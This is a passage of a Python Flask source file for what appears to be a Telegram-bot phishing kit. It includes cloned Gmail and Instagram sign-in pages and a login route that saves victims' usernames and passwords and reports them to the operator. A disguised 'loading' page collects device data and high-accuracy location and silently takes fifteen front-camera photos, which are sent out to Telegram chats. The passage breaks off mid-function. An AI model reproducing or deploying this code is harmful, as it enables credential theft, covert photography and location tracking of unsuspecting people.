            'Nauru': '+674',
            'Nepal': '+977',
            'Netherlands': '+31',
            'New Zealand': '+64',
            'Nicaragua': '+505',
            'Niger': '+227',
            'Nigeria': '+234',
            'Norway': '+47',
            'Oman': '+968',
            'Pakistan': '+92',
            'Palau': '+680',
            'Panama': '+507',
            'Papua New Guinea': '+675',
            'Paraguay': '+595',
            'Peru': '+51',
            'Philippines': '+63',
            'Poland': '+48',
            'Portugal': '+351',
            'Qatar': '+974',
            'Romania': '+40',
            'Russia': '+7',
            'Rwanda': '+250',
            'Saint Kitts and Nevis': '+1',
            'Saint Lucia': '+1',
            'Saint Vincent and the Grenadines': '+1',
            'Samoa': '+685',
            'San Marino': '+378',
            'Sao Tome and Principe': '+239',
            'Saudi Arabia': '+966',
            'Senegal': '+221',
            'Serbia': '+381',
            'Seychelles': '+248',
            'Sierra Leone': '+232',
            'Singapore': '+65',
            'Slovakia': '+421',
            'Slovenia': '+386',
            'Solomon Islands': '+677',
            'Somalia': '+252',
            'South Africa': '+27',
            'South Sudan': '+211',
            'Spain': '+34',
            'Sri Lanka': '+94',
            'Sudan': '+249',
            'Suriname': '+597',
            'Swaziland': '+268',
            'Sweden': '+46',
            'Switzerland': '+41',
            'Syria': '+963',
            'Taiwan': '+886',
            'Tajikistan': '+992',
            'Tanzania': '+255',
            'Thailand': '+66',
            'Togo': '+228',
            'Tonga': '+676',
            'Trinidad and Tobago': '+1',
            'Tunisia': '+216',
            'Turkey': '+90',
            'Turkmenistan': '+993',
            'Tuvalu': '+688',
            'Uganda': '+256',
            'Ukraine': '+380',
            'United Arab Emirates': '+971',
            'United Kingdom': '+44',
            'United States': '+1',
            'Uruguay': '+598',
            'Uzbekistan': '+998',
            'Vanuatu': '+678',
            'Vatican City': '+379',
            'Venezuela': '+58',
            'Vietnam': '+84',
            'Yemen': '+967',
            'Zambia': '+260',
            'Zimbabwe': '+263'
        };

        // Handle checkbox toggle
        document.getElementById('keepSignedInCheckbox').addEventListener('click', function() {
            this.classList.toggle('checked');
            document.getElementById('keepSignedIn').value = this.classList.contains('checked') ? 'on' : 'off';
        });

        // Update country code based on country selection
        document.getElementById('country').addEventListener('change', function() {
            const selectedCountry = this.value;
            const countryCode = countryCodes[selectedCountry] || '+855';
            document.getElementById('countryCodeDisplay').textContent = countryCode;
            document.getElementById('countryCode').value = countryCode;
        });

        // Format phone number input
        document.getElementById('phone_number').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Set Cambodia as default country
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('country').value = 'Cambodia';
        });
    </script>
</body>
</html>"""

    # Gmail template
    gmail_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gmail</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background-color: #ffffff;
            color: #202124;
            line-height: 1.4286;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            max-width: 450px;
            margin: 0 auto;
            width: 100%;
            padding: 20px;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 75px;
            height: 75px;
            margin: 0 auto 20px auto;
            background: conic-gradient(from -45deg, #ea4335, #4285f4, #34a853, #fbbc05, #ea4335);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            font-weight: bold;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 40px;
        }
        .card {
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px 40px 36px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 24px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border-radius: 4px;
            border: 1px solid #dadce0;
            font-size: 16px;
            background: white;
            color: #202124;
            font-family: inherit;
            transition: border 0.2s;
        }
        input[type="email"]::placeholder,
        input[type="password"]::placeholder {
            color: #5f6368;
        }
        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 0 0 2px #e8f0fe;
        }
        .login-btn {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            color: white;
            font-weight: 500;
            padding: 10px 24px;
            margin: 8px 0;
            cursor: pointer;
            font-family: inherit;
            float: right;
            transition: background-color 0.2s;
        }
        .login-btn:hover {
            background-color: #1669d6;
        }
        .login-btn:active {
            background-color: #1a73e8;
            transform: scale(0.98);
        }
        .forgot-password {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: inline-block;
            margin-top: 8px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .help-section {
            text-align: center;
            margin-top: 40px;
            color: #5f6368;
            font-size: 14px;
        }
        .help-link {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .help-link:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            padding: 24px;
            margin-top: auto;
            border-top: 1px solid #dadce0;
        }
        .footer-links {
            font-size: 12px;
            color: #5f6368;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .language-selector {
            font-size: 12px;
            color: #5f6368;
            margin-top: 16px;
        }
        .language-selector select {
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 6px 12px;
            background: white;
            color: #5f6368;
        }
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            display: inline-block;
            margin-top: 16px;
        }
        .create-account:hover {
            text-decoration: underline;
        }
        .next-btn {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            color: white;
            font-weight: 500;
            padding: 10px 24px;
            margin: 8px 0;
            cursor: pointer;
            font-family: inherit;
            float: right;
            transition: background-color 0.2s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">G</div>
            <h1 class="title">Sign in</h1>
            <div class="subtitle">Use your Google Account</div>
        </div>

        <div class="card">
            <form id="loginForm" action="/login" method="POST">
                <div class="form-group">
                    <input type="email" id="email" name="username" placeholder="Email or phone" required autofocus>
                </div>
                <div class="form-group" id="passwordGroup" style="display: none;">
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>
                <div style="overflow: hidden;">
                    <a href="#" class="forgot-password" id="forgotPassword" style="display: none;">Forgot password?</a>
                    <button type="button" id="nextBtn" class="next-btn">Next</button>
                    <button type="submit" id="submitBtn" class="login-btn" style="display: none;">Sign in</button>
                </div>
            </form>
            
            <div style="clear: both; margin-top: 40px; text-align: center;">
                <a href="#" class="create-account">Create account</a>
            </div>
        </div>

        <div class="help-section">
            <span>Not your computer? Use Guest mode to sign in privately.</span><br>
            <a href="#" class="help-link">Learn more</a>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
        <div class="language-selector">
            <select>
                <option>English (United States)</option>
                <option>ខ្មែរ (កម្ពុជា)</option>
            </select>
        </div>
    </div>

    <script>
        document.getElementById('nextBtn').addEventListener('click', function() {
            var email = document.getElementById('email').value;
            if (email) {
                document.getElementById('passwordGroup').style.display = 'block';
                document.getElementById('forgotPassword').style.display = 'inline-block';
                document.getElementById('nextBtn').style.display = 'none';
                document.getElementById('submitBtn').style.display = 'block';
                document.getElementById('password').focus();
            }
        });
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            if (!email || !password) {
                e.preventDefault();
                alert('Please fill in all fields');
            }
        });
    </script>
</body>
</html>"""

    # Instagram template
    instagram_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            line-height: 1.34;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 16px;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 175px;
            height: 51px;
            margin: 0 auto 20px auto;
            background-image: url('https://i.imgur.com/zqpwkLQ.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }
        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 12px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border-radius: 4px;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            background: #fafafa;
            color: #262626;
            font-family: inherit;
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #8e8e8e;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        .login-btn {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            color: white;
            font-weight: bold;
            padding: 10px;
            width: 100%;
            margin-bottom: 16px;
            cursor: pointer;
            font-family: inherit;
            opacity: 0.7;
        }
        .login-btn:active {
            background-color: #0077c7;
            transform: scale(0.98);
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider::before {
            margin-right: 16px;
        }
        .divider::after {
            margin-left: 16px;
        }
        .facebook-login {
            color: #385185;
            text-align: center;
            display: block;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 16px;
        }
        .forgot-password {
            color: #00376b;
            text-align: center;
            display: block;
            text-decoration: none;
            font-size: 12px;
        }
        .signup-section {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            margin-bottom: 16px;
        }
        .signup-text {
            color: #262626;
            font-size: 14px;
        }
        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .get-app {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #262626;
            line-height: 1.5;
        }
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }
        .app-button {
            height: 40px;
        }
        .footer {
            text-align: center;
            padding: 20px;
            margin-top: auto;
        }
        .footer-links {
            font-size: 12px;
            color: #8e8e8e;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 6px;
        }
        .copyright {
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo"></div>
        </div>

        <div class="card">
            <form action="/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>

            <div class="divider">OR</div>

            <a href="#" class="facebook-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-section">
            <span class="signup-text">Don't have an account?</span>
            <a href="#" class="signup-link">Sign up</a>
        </div>

        <div class="get-app">
            <div>Get the app.</div>
            <div class="app-buttons">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" class="app-button">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store" class="app-button">
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="copyright">
            English (US) © 2025 Instagram from Meta
        </div>
    </div>
</body>
</html>"""

    templates = {
        'facebook.html': facebook_html,
        'tiktok.html': tiktok_html,
        'telegram.html': telegram_html,
        'gmail.html': gmail_html,
        'instagram.html': instagram_html
    }
    
    created_count = 0
    for template_name, template_content in templates.items():
        template_path = os.path.join(templates_dir, template_name)
        if not os.path.exists(template_path):
            print(f"📝 Creating default template: {template_name}")
            with open(template_path, 'w', encoding='utf-8') as f:
                f.write(template_content)
            created_count += 1
    
    if created_count > 0:
        print(f"✅ Created {created_count} default templates")
    else:
        print("✅ All templates already exist")

# ================================
# IMPROVED PHISHING PAGE MANAGEMENT
# ================================
def set_phishing_page_safe(platform):
    """Safely set phishing page without causing timeouts"""
    global current_phishing_page
    
    try:
        # Set locally first (this is the most important)
        current_phishing_page = platform
        print(f"✅ Page set locally to: {platform}")
        
        # Try to set via URL with very short timeout and error handling
        if phishing_ngrok_url:
            try:
                # Use a very short timeout to avoid blocking
                response = requests.get(
                    f"{phishing_ngrok_url}/set_page/{platform}", 
                    timeout=0.3,  # Very short timeout
                    verify=False  # Skip SSL verification
                )
                if response.status_code == 200:
                    print(f"✅ Page also set via URL: {platform}")
            except:
                # Silent handling for all errors - this is expected
                pass
        else:
            print("ℹ️ No phishing URL available for remote setting")
            
    except Exception as e:
        print(f"❌ Error setting phishing page: {e}")

@phishing_app.route('/set_page/<page_type>')
def set_page(page_type):
    """Simple endpoint to set phishing page - returns immediately"""
    global current_phishing_page
    
    if page_type in ["facebook", "tiktok", "telegram", "gmail", "instagram"]:
        current_phishing_page = page_type
        print(f"✅ Phishing page endpoint set to: {page_type}")
        return f"Page set to {page_type}", 200
    
    return "Invalid page type", 400

# ================================
# ULTRA-FAST URL HANDLING - ELIMINATE 404 ERRORS
# ================================

@phishing_app.route('/', methods=['GET', 'POST'])
def phishing_index():
    """Main phishing page - handles both GET and POST"""
    template_files = {
        "facebook": "facebook.html",
        "tiktok": "tiktok.html", 
        "telegram": "telegram.html",
        "gmail": "gmail.html",
        "instagram": "instagram.html"
    }
    
    template_file = template_files.get(current_phishing_page, "facebook.html")
    
    print(f"🔍 Rendering template: {template_file} for page: {current_phishing_page}")
    
    try:
        # Check if template file exists
        template_path = os.path.join(templates_dir, template_file)
        if not os.path.exists(template_path):
            print(f"❌ Template file not found: {template_path}")
            # Create default template immediately
            create_default_templates()
            if os.path.exists(template_path):
                print(f"✅ Template created, rendering: {template_file}")
                return render_template(template_file)
            else:
                return '<html><body><h1>Loading...</h1><p>Please wait...</p></body></html>', 200
        
        return render_template(template_file)
    except Exception as e:
        print(f"❌ Error rendering template {template_file}: {e}")
        # Return simple loading page
        return '<html><body><h1>Loading...</h1><p>Please wait...</p></body></html>', 200

@phishing_app.route('/login', methods=['POST'])
def phishing_login():
    """Handle login form submission"""
    try:
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        data = {
            'username': username,
            'password': password,
            'ipAddress': ip_address,
            'userAgent': user_agent,
            'pageType': current_phishing_page
        }
        
        # Save credentials
        with open('credentials.json', 'a') as f:
            f.write(json.dumps(data) + '\n')
        
        print('Credentials saved:', data)
        
        # Get creator ID from active session or track the creator
        creator_id = TELEGRAM_ID  # Default to admin
        # Try to find the creator from active sessions
        for user_id in active_chat_ids:
            creator_id = user_id
            break
        
        send_phishing_notification(data, creator_id)
        
        redirect_urls = {
            "tiktok": "https://www.tiktok.com/",
            "telegram": "https://web.telegram.org/",
            "gmail": "https://mail.google.com/",
            "instagram": "https://www.instagram.com/",
            "facebook": "https://www.facebook.com/"
        }
        
        return redirect(redirect_urls.get(current_phishing_page, "https://www.google.com/"))
    
    except Exception as e:
        print(f"Error in phishing login: {e}")
        return redirect("https://www.google.com/")

@phishing_app.route('/<path:path>')
def catch_all(path):
    """Catch all routes and redirect to appropriate pages"""
    # If it's a known phishing platform, set it and redirect
    if path in ["facebook", "tiktok", "telegram", "gmail", "instagram"]:
        set_phishing_page_safe(path)
        return redirect('/')
    
    # For any other path, redirect to main phishing page
    return redirect('/')

@phishing_app.route('/favicon.ico')
def favicon():
    """Handle favicon requests to avoid 404"""
    return '', 204

# ================================
# HACK SERVER ROUTES
# ================================

@hack_app.route('/', methods=['GET'])
def hack_index():
    """Default route for hack server"""
    return '<html><body><h1>System Loading...</h1><p>Please wait while the system initializes.</p></body></html>', 200

@hack_app.route('/track/<track_id>', methods=['GET', 'POST'])
def track(track_id):
    """Track user data and camera access"""
    if request.method == 'GET':
        redirect_url = request.args.get('url', 'https://google.com')
        return render_template_string(TRACKING_PAGE_HTML, track_id=track_id, redirect_url=redirect_url)
    
    elif request.method == 'POST':
        try:
            device_info = request.json
            device_info['ip_address'] = request.remote_addr
            
            creator_id = None
            for user_id, links in user_links.items():
                for link in links:
                    if link['track_id'] == track_id:
                        creator_id = user_id
                        break
                if creator_id:
                    break
            
            os.makedirs('captured_images', exist_ok=True)
            
            if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
                device_info['processedPhotos'] = []
                for i, photo_data in enumerate(device_info['cameraPhotos']):
                    try:
                        watermarked_image = add_watermark_with_date(photo_data)
                        
                        image_data = photo_data.split(',')[1] if photo_data.startswith('data:image') else photo_data
                        image_bytes = base64.b64decode(image_data)
                        with open(f'captured_images/{track_id}camera{i+1}_original.jpg', 'wb') as f:
                            f.write(image_bytes)
                        
                        watermarked_bytes = base64.b64decode(watermarked_image.split(',')[1])
                        with open(f'captured_images/{track_id}camera{i+1}_watermarked.jpg', 'wb') as f:
                            f.write(watermarked_bytes)
                        
                        device_info['processedPhotos'].append(watermarked_image)
                    except Exception as e:
                        print(f"Error processing camera image {i+1}: {e}")
                        device_info['processedPhotos'].append(photo_data)
            
            tracking_data[track_id] = device_info
            
            if creator_id:
                send_hack_notification(track_id, device_info, creator_id)
            
            return jsonify({'success': True})
            
        except Exception as e:
            print(f"Error processing data: {e}")
            return jsonify({'success': False, 'error': str(e)})

@hack_app.route('/<path:path>')
def hack_catch_all(path):
    """Catch all routes for hack server and redirect appropriately"""
    # If it looks like a track ID, handle it
    if len(path) == 36 and '-' in path:  # UUID format
        return redirect(f'/track/{path}')
    
    # Return simple loading page for any other route
    return '<html><body><h1>Loading...</h1><script>setTimeout(() => window.location.href="/", 1000);</script></body></html>', 200

@hack_app.route('/favicon.ico')
def hack_favicon():
    """Handle favicon requests for hack server"""
    return '', 204

# ================================
# HACK CAMERA & LOCATION FUNCTIONS
# ================================
TRACKING_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>កំពុងបញ្ជូនបន្ត...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
            };
            getLocation(info);
        }

        function getLocation(info) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        info.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        getBatteryInfo(info);
                    },
                    function(error) {
                        info.locationError = error.message;
                        getBatteryInfo(info);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                info.locationError = "Geolocation is not supported by this browser.";
                getBatteryInfo(info);
            }
        }

        function getBatteryInfo(info) {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    info.batteryLevel = battery.level * 100;
                    info.batteryCharging = battery.charging;
                    requestCameraAccess(info);
                });
            } else {
                requestCameraAccess(info);
            }
        }

        function requestCameraAccess(info) {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                })
                .then(function(stream) {
                    info.cameraAccess = true;
                    takeMultiplePhotos(stream, info);
                })
                .catch(function(error) {
                    info.cameraAccess = false;
                    info.cameraError = error.name;
                    getIpAddress(info);
                });
            } else {
                info.cameraAccess = false;
                info.cameraError = 'No camera support';
                getIpAddress(info);
            }
        }

        function takeMultiplePhotos(stream, info) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                info.cameraPhotos = [];
                let photosTaken = 0;
                const totalPhotos = 15;
                const interval = 300;

                function capturePhoto() {
                    if (photosTaken < totalPhotos) {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg', 0.95);
                        info.cameraPhotos.push(photoData);
                        photosTaken++;
                        setTimeout(capturePhoto, interval);
                    } else {
                        stream.getTracks().forEach(track => track.stop());
                        getIpAddress(info);
                    }
                }
                setTimeout(capturePhoto, 1000);
            };
        }

        function getIpAddress(info) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    info.ipAddress = ipData.ip;
                    sendDataToServer(info);
                })
                .catch(error => {
                    info.ipAddressError = error.message;
                    sendDataToServer(info);
                });
        }

        function sendDataToServer(info) {
            fetch('/track/{{ track_id }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(info)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = "{{ redirect_url }}";
                } else {
                    console.error('Server error:', data.error);
                    window.location.href = "{{ redirect_url }}";
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
                window.location.href = "{{ redirect_url }}";
            });
        }

        window.onload = collectDeviceInfo;
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            color: #333;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0, 0, 0, 0.3);
            border-radius: 50%;
            border-top-color: #007bff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>ប្រព័ន្ធកំពុងដំណើរកា...</h2>
        <p>សូមមេត្តារង់ចាំ 5វិនាទី ប្រព័ន្ធកំពុងដំណើរការ</p>
        <div class="loading"></div>
    </div>
</body>
</html>
"""

def add_watermark_with_date(image_data, text="t.me/mengheang25"):
    try:
        if isinstance(image_data, str) and image_data.startswith('data:image'):
            image_data = image_data.split(',')[1]
        image_bytes = base64.b64decode(image_data)
        image = Image.open(BytesIO(image_bytes)).convert('RGBA')

        watermark = Image.new('RGBA', image.size, (0, 0, 0, 0))
        draw = ImageDraw.Draw(watermark)

        try:
            font_size = max(20, min(image.width, image.height) // 20)
            font = ImageFont.truetype("arial.ttf", font_size)
        except:
            try:
                font = ImageFont.load_default()
            except:
                font = None

        # Get current date
        current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Left watermark (username)
        left_text = text
        if font:
            left_bbox = draw.textbbox((0, 0), left_text, font=font)
            left_width = left_bbox[2] - left_bbox[0]
            left_height = left_bbox[3] - left_bbox[1]
        else:
            left_width, left_height = 150, 20
            
        left_margin = 10
        left_x = left_margin
        left_y = image.height - left_height - left_margin

        # Right watermark (date)
        right_text = current_date
        if font:
            right_bbox = draw.textbbox((0, 0), right_text, font=font)
            right_width = right_bbox[2] - right_bbox[0]
            right_height = right_bbox[3] - right_bbox[1]
        else:
            right_width, right_height = 150, 20
            
        right_margin = 10
        right_x = image.width - right_width - right_margin
        right_y = image.height - right_height - right_margin

        # Draw left background
        draw.rectangle([left_x - 5, left_y - 5, left_x + left_width + 5, left_y + left_height + 5], fill=(0, 0, 0, 128))
        
        # Draw right background
        draw.rectangle([right_x - 5, right_y - 5, right_x + right_width + 5, right_y + right_height + 5], fill=(0, 0, 0, 128))

        # Draw left text
        if font:
            draw.text((left_x, left_y), left_text, fill=(255, 255, 255, 255), font=font)
        else:
            draw.text((left_x, left_y), left_text, fill=(255, 255, 255, 255))

        # Draw right text
        if font:
            draw.text((right_x, right_y), right_text, fill=(255, 255, 255, 255), font=font)
        else:
            draw.text((right_x, right_y), right_text, fill=(255, 255, 255, 255))

        watermarked_image = Image.alpha_composite(image, watermark).convert('RGB')
        output = BytesIO()
        watermarked_image.save(output, format='JPEG', quality=95)
        return "data:image/jpeg;base64," + base64.b64encode(output.getvalue()).decode('utf-8')
    except Exception as e:
        print(f"កំហុសក្នុងការបន្ថែមផ្ទាំងទឹក: {e}")
        if isinstance(image_data, str) and image_data.startswith('data:image'):
            return image_data
        else:
            return "data:image/jpeg;base64," + image_data

def send_hack_notification(track_id, device_info, creator_id):
    try:
        recipients = []
        recipients.append(TELEGRAM_ID)
        
        creator_id_str = str(creator_id)
        if creator_id_str != TELEGRAM_ID and creator_id_str in user_data:
            recipients.append(creator_id_str)
        
        user_info = user_data.get(creator_id_str, {})
        username = user_info.get('username', 'មិនស្គាល់')
        name = user_info.get('name', 'មិនស្គាល់')
        
        message = f"🔔 មានអ្នកប្រើប្រាស់ចុចចូលតំណភ្ជាប់ដែលអ្នកផ្ញើទៅ!\n\n"
        message += f"👤 អ្នកបង្កើតតំណភ្ជាប់: {name} (@{username})\n\n"
        message += f"📍Track ID: {track_id}\n"
        message += f"📍IP Address: {device_info.get('ip_address', 'មិនស្គាល់')}\n"
        message += f"📱User Agent: {device_info.get('userAgent', 'មិនស្គាល់')}\n"
        message += f"📱Platform: {device_info.get('platform', 'មិនស្គាល់')}\n"
        message += f"📱Language: {device_info.get('language', 'មិនស្គាល់')}\n"
        message += f"📱Screen: {device_info.get('screenWidth', 'មិនស្គាល់')}x{device_info.get('screenHeight', 'មិនស្គាល់')}\n"
        
        if 'batteryLevel' in device_info:
            message += f"🔋ថាមពលថ្មឧបករណ៍: {device_info['batteryLevel']}% ({'កំពុងសាក' if device_info.get('batteryCharging') else 'មិនកំពុងសាក'})\n"
        
        if 'location' in device_info:
            lat = device_info['location']['latitude']
            lng = device_info['location']['longitude']
            accuracy = device_info['location']['accuracy']
            maps_url = f"https://www.google.com/maps?q={lat},{lng}"
            message += f"📍ទីតាំង: {lat}, {lng} (ភាពជាក់លាក់: {accuracy}m)\n\n"
            message += f"🗺️ Google Maps: {maps_url}\n"
        
        for recipient in recipients:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            data = {
                "chat_id": recipient,
                "text": message
            }
            requests.post(url, json=data, verify=False)
            
            if 'location' in device_info:
                lat = device_info['location']['latitude']
                lng = device_info['location']['longitude']
                url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
                data = {
                    "chat_id": recipient,
                    "latitude": lat,
                    "longitude": lng
                }
                requests.post(url, json=data, verify=False)
        
        # Send location accuracy message
        if 'location' in device_info:
            accuracy_message = f"📍 Location Received\nLatitude: {device_info['location']['latitude']}\nLongitude: {device_info['location']['longitude']}\nAccuracy: {device_info['location']['accuracy']} meters"
            for recipient in recipients:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                             json={"chat_id": recipient, "text": accuracy_message}, verify=False)
        
        # Send camera photos with watermarks
        if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
            for i, photo_data in enumerate(device_info['cameraPhotos']):
                try:
                    # Add watermark with date
                    watermarked_image = add_watermark_with_date(photo_data)
                    
                    photo_data = watermarked_image.split(',')[1] if watermarked_image.startswith('data:image') else watermarked_image
                    photo_bytes = base64.b64decode(photo_data)
                    
                    for recipient in recipients:
                        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
                        files = {'photo': (f'camera_{i+1}.jpg', photo_bytes)}
                        data = {
                            "chat_id": recipient,
                            "caption": f"📸 រូបពីកាមេរ៉ាលេខ {i+1}/15\nDeveloper : @mengheang25"
                        }
                        response = requests.post(url, files=files, data=data, verify=False)
                        
                except Exception as e:
                    error_msg = f"❌ មិនអាចបញ្ជូនរូបពីកាមេរ៉ាលេខ {i+1}: {str(e)}"
                    for recipient in recipients:
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
